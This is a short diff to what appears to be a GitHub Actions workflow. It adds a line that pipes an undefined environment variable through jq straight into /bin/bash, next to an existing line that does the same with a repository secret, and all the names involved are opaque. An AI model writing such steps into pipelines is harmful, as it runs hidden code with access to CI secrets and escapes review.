@@ -17,6 +17,7 @@ jobs:
           c6: ${{ secrets.c6 }}
         run: |
           printf '%s' "$c6" | jq -r .zgya83 | /bin/bash
+          echo $tjc73109 | jq -r .bkeb02765 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
